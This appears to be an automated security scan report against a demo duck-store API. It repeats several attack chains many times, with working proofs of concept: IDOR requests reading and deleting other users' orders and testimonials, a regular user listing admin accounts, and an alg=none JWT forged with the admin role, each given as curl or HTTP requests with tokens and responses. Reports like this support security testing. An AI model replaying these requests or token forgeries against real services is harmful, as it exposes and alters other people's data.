  - session — https://duck-store.escape.tech/api/v1/users/ · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/users/ returned 200 with a 706B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/orders/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create an order (ID 9)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's order via IDOR:
```
GET /api/v1/orders/9 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```

4. Response: 200 OK with user_a's order details:
```json
{"id":9,"user_id":"f051209f-7ba9-4534-9607-8e4cede8eafa","total_price":35.96,"status":"processing","items":[{"product_id":1,"quantity":3,"price":9.99,"id":16,"product":{"name":"Classic Yellow Duck","description":"The timeless classic rubber duck that started it all!","price":9.99,"stock":82,"color":"Yellow","material":"Rubber","size":"Medium","image_url":"/static/products/classic-duck.png","id":1,"created_at":"2026-09-28T23:39:05.241260"}}],"created_at":"2026-09-29T01:33:53.528773","shipping_first_name":"Test","shipping_last_name":"User","shipping_address":"123 Test St","shipping_city":"Test City","shipping_zip_code":"12345","shipping_country":"US"}
```

5. PUT/DELETE on the same endpoint returned 405 Method Not Allowed (read-only IDOR)`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/users/ · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/users/ returned 200 with a 706B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `Request with regular user token (testuser1, role: user):
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYjkwYTE5YjMtNzJkZi00NDhlLWI0MmUtY2EwZDU1MjMzOGU1IiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY3MDA5NH0.1Nhl4KX6PqDVgb8Z9mEKttzDWyLU15fPS-lKAV2vBYc" https://duck-store.escape.tech/api/v1/admin/users

Response: HTTP 200 with full user list including admin user:
[{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","created_at":"2026-09-29T07:39:20.400122","role":"admin","first_name":"Admin","last_name":"Duck","avatar_url":"/static/avatars/sarah.png","bio":"Store Administrator","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false}, ...]`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/orders/coupons · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/orders/coupons returned 200 with a 963B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/users/{user_id} · PoC: `# As user_a (testuser1, user_id: 00ad6888-4bd0-463c-9948-96ce6318117a)
curl "https://duck-store.escape.tech/api/v1/users/0aeac16a-cb93-44cb-8b56-ce07b3bcb340" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response contains user_b's private data:
{"id":"0aeac16a-cb93-44cb-8b56-ce07b3bcb340","username":"testuser2","email":"testuser2@duck-store.escape.tech","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"role":"user","created_at":"2026-09-28T23:47:47.761385","totp_enabled":false,"can_be_deleted":true}

# user_a should not have access to user_b's profile data`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/orders/coupons · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/orders/coupons returned 200 with a 963B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — PUT/DELETE/GET https://duck-store.escape.tech/api/v1/testimonials/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create a testimonial (ID 18)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's testimonial via IDOR:
```
GET /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 200 OK with user_a's testimonial data

4. MODIFY user_a's testimonial as user_b:
```
PUT /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
Content-Type: application/json

{"content": "Updated by user_a", "rating": 1}
```
Response: 200 OK - testimonial successfully modified

5. DELETE user_a's testimonial as user_b:
```
DELETE /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 204 No Content - testimonial successfully deleted`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/orders/coupons · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/orders/coupons returned 200 with a 963B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/orders/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create an order (ID 9)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's order via IDOR:
```
GET /api/v1/orders/9 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```

4. Response: 200 OK with user_a's order details:
```json
{"id":9,"user_id":"f051209f-7ba9-4534-9607-8e4cede8eafa","total_price":35.96,"status":"processing","items":[{"product_id":1,"quantity":3,"price":9.99,"id":16,"product":{"name":"Classic Yellow Duck","description":"The timeless classic rubber duck that started it all!","price":9.99,"stock":82,"color":"Yellow","material":"Rubber","size":"Medium","image_url":"/static/products/classic-duck.png","id":1,"created_at":"2026-09-28T23:39:05.241260"}}],"created_at":"2026-09-29T01:33:53.528773","shipping_first_name":"Test","shipping_last_name":"User","shipping_address":"123 Test St","shipping_city":"Test City","shipping_zip_code":"12345","shipping_country":"US"}
```

5. PUT/DELETE on the same endpoint returned 405 Method Not Allowed (read-only IDOR)`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/orders/coupons · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/orders/coupons returned 200 with a 963B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `Request with regular user token (testuser1, role: user):
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYjkwYTE5YjMtNzJkZi00NDhlLWI0MmUtY2EwZDU1MjMzOGU1IiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY3MDA5NH0.1Nhl4KX6PqDVgb8Z9mEKttzDWyLU15fPS-lKAV2vBYc" https://duck-store.escape.tech/api/v1/admin/users

Response: HTTP 200 with full user list including admin user:
[{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","created_at":"2026-09-29T07:39:20.400122","role":"admin","first_name":"Admin","last_name":"Duck","avatar_url":"/static/avatars/sarah.png","bio":"Store Administrator","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false}, ...]`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/reviews/product/2/stats · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/reviews/product/2/stats returned 200 with a 81B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/users/{user_id} · PoC: `# As user_a (testuser1, user_id: 00ad6888-4bd0-463c-9948-96ce6318117a)
curl "https://duck-store.escape.tech/api/v1/users/0aeac16a-cb93-44cb-8b56-ce07b3bcb340" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response contains user_b's private data:
{"id":"0aeac16a-cb93-44cb-8b56-ce07b3bcb340","username":"testuser2","email":"testuser2@duck-store.escape.tech","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"role":"user","created_at":"2026-09-28T23:47:47.761385","totp_enabled":false,"can_be_deleted":true}

# user_a should not have access to user_b's profile data`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/reviews/product/2/stats · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/reviews/product/2/stats returned 200 with a 81B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — PUT/DELETE/GET https://duck-store.escape.tech/api/v1/testimonials/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create a testimonial (ID 18)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's testimonial via IDOR:
```
GET /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 200 OK with user_a's testimonial data

4. MODIFY user_a's testimonial as user_b:
```
PUT /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
Content-Type: application/json

{"content": "Updated by user_a", "rating": 1}
```
Response: 200 OK - testimonial successfully modified

5. DELETE user_a's testimonial as user_b:
```
DELETE /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 204 No Content - testimonial successfully deleted`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/reviews/product/2/stats · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/reviews/product/2/stats returned 200 with a 81B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/orders/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create an order (ID 9)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's order via IDOR:
```
GET /api/v1/orders/9 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```

4. Response: 200 OK with user_a's order details:
```json
{"id":9,"user_id":"f051209f-7ba9-4534-9607-8e4cede8eafa","total_price":35.96,"status":"processing","items":[{"product_id":1,"quantity":3,"price":9.99,"id":16,"product":{"name":"Classic Yellow Duck","description":"The timeless classic rubber duck that started it all!","price":9.99,"stock":82,"color":"Yellow","material":"Rubber","size":"Medium","image_url":"/static/products/classic-duck.png","id":1,"created_at":"2026-09-28T23:39:05.241260"}}],"created_at":"2026-09-29T01:33:53.528773","shipping_first_name":"Test","shipping_last_name":"User","shipping_address":"123 Test St","shipping_city":"Test City","shipping_zip_code":"12345","shipping_country":"US"}
```

5. PUT/DELETE on the same endpoint returned 405 Method Not Allowed (read-only IDOR)`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/reviews/product/2/stats · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/reviews/product/2/stats returned 200 with a 81B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `Request with regular user token (testuser1, role: user):
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYjkwYTE5YjMtNzJkZi00NDhlLWI0MmUtY2EwZDU1MjMzOGU1IiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY3MDA5NH0.1Nhl4KX6PqDVgb8Z9mEKttzDWyLU15fPS-lKAV2vBYc" https://duck-store.escape.tech/api/v1/admin/users

Response: HTTP 200 with full user list including admin user:
[{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","created_at":"2026-09-29T07:39:20.400122","role":"admin","first_name":"Admin","last_name":"Duck","avatar_url":"/static/avatars/sarah.png","bio":"Store Administrator","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false}, ...]`
- Chain: session → pii_read
  - session — POST https://duck-store.escape.tech/api/v1/auth/login (JWT validation on all protected endpoints) · PoC: `1. Original user_a token (HS256): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiZjA1MTIwOWYtN2JhOS00NTM0LTk2MDctOGU0Y2VkZThlYWZhIiwidXNlcm5hbWUiOiJ1c2VyYV90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDAwfQ.jjm1FNMyQsfAxt3FEemcaRAUeX9QpHRpTSpgz3afX-I

2. Forged token with alg=none and role=admin: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiZjA1MTIwOWYtN2JhOS00NTM0LTk2MDctOGU0Y2VkZThlYWZhIiwidXNlcm5hbWUiOiJ1c2VyYV90ZXN0MiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc5MDY0NjQwMH0.

3. Request with forged token:
```
GET /api/v1/admin/users HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiZjA1MTIwOWYtN2JhOS00NTM0LTk2MDctOGU0Y2VkZThlYWZhIiwidXNlcm5hbWUiOiJ1c2VyYV90ZXN0MiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc5MDY0NjQwMH0.
```

4. Response: 200 OK with full user list including admin users

5. Also works on /api/v1/users/me/profile (200 OK) and /api/v1/users/ (200 OK)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/users/{user_id} · PoC: `# As user_a (testuser1, user_id: 00ad6888-4bd0-463c-9948-96ce6318117a)
curl "https://duck-store.escape.tech/api/v1/users/0aeac16a-cb93-44cb-8b56-ce07b3bcb340" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response contains user_b's private data:
{"id":"0aeac16a-cb93-44cb-8b56-ce07b3bcb340","username":"testuser2","email":"testuser2@duck-store.escape.tech","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"role":"user","created_at":"2026-09-28T23:47:47.761385","totp_enabled":false,"can_be_deleted":true}

# user_a should not have access to user_b's profile data`
- Chain: session → pii_read
  - session — POST https://duck-store.escape.tech/api/v1/auth/login (JWT validation on all protected endpoints) · PoC: `1. Original user_a token (HS256): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiZjA1MTIwOWYtN2JhOS00NTM0LTk2MDctOGU0Y2VkZThlYWZhIiwidXNlcm5hbWUiOiJ1c2VyYV90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDAwfQ.jjm1FNMyQsfAxt3FEemcaRAUeX9QpHRpTSpgz3afX-I

2. Forged token with alg=none and role=admin: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiZjA1MTIwOWYtN2JhOS00NTM0LTk2MDctOGU0Y2VkZThlYWZhIiwidXNlcm5hbWUiOiJ1c2VyYV90ZXN0MiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc5MDY0NjQwMH0.

3. Request with forged token:
```
GET /api/v1/admin/users HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiZjA1MTIwOWYtN2JhOS00NTM0LTk2MDctOGU0Y2VkZThlYWZhIiwidXNlcm5hbWUiOiJ1c2VyYV90ZXN0MiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc5MDY0NjQwMH0.
```

4. Response: 200 OK with full user list including admin users

5. Also works on /api/v1/users/me/profile (200 OK) and /api/v1/users/ (200 OK)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — PUT/DELETE/GET https://duck-store.escape.tech/api/v1/testimonials/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create a testimonial (ID 18)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's testimonial via IDOR:
```
GET /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 200 OK with user_a's testimonial data

4. MODIFY user_a's testimonial as user_b:
```
PUT /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
Content-Type: application/json

{"content": "Updated by user_a", "rating": 1}
```
Response: 200 OK - testimonial successfully modified

5. DELETE user_a's testimonial as user_b:
```
DELETE /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 204 No Content - testimonial successfully deleted`
- Chain: session → pii_read
  - session — POST https://duck-store.escape.tech/api/v1/auth/login (JWT validation on all protected endpoints) · PoC: `1. Original user_a token (HS256): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiZjA1MTIwOWYtN2JhOS00NTM0LTk2MDctOGU0Y2VkZThlYWZhIiwidXNlcm5hbWUiOiJ1c2VyYV90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDAwfQ.jjm1FNMyQsfAxt3FEemcaRAUeX9QpHRpTSpgz3afX-I

2. Forged token with alg=none and role=admin: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiZjA1MTIwOWYtN2JhOS00NTM0LTk2MDctOGU0Y2VkZThlYWZhIiwidXNlcm5hbWUiOiJ1c2VyYV90ZXN0MiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc5MDY0NjQwMH0.

3. Request with forged token:
```
GET /api/v1/admin/users HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiZjA1MTIwOWYtN2JhOS00NTM0LTk2MDctOGU0Y2VkZThlYWZhIiwidXNlcm5hbWUiOiJ1c2VyYV90ZXN0MiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc5MDY0NjQwMH0.
```

4. Response: 200 OK with full user list including admin users

5. Also works on /api/v1/users/me/profile (200 OK) and /api/v1/users/ (200 OK)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/orders/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create an order (ID 9)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's order via IDOR:
```
GET /api/v1/orders/9 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```

4. Response: 200 OK with user_a's order details:
```json
{"id":9,"user_id":"f051209f-7ba9-4534-9607-8e4cede8eafa","total_price":35.96,"status":"processing","items":[{"product_id":1,"quantity":3,"price":9.99,"id":16,"product":{"name":"Classic Yellow Duck","description":"The timeless classic rubber duck that started it all!","price":9.99,"stock":82,"color":"Yellow","material":"Rubber","size":"Medium","image_url":"/static/products/classic-duck.png","id":1,"created_at":"2026-09-28T23:39:05.241260"}}],"created_at":"2026-09-29T01:33:53.528773","shipping_first_name":"Test","shipping_last_name":"User","shipping_address":"123 Test St","shipping_city":"Test City","shipping_zip_code":"12345","shipping_country":"US"}
```

5. PUT/DELETE on the same endpoint returned 405 Method Not Allowed (read-only IDOR)`
- Chain: session → pii_read
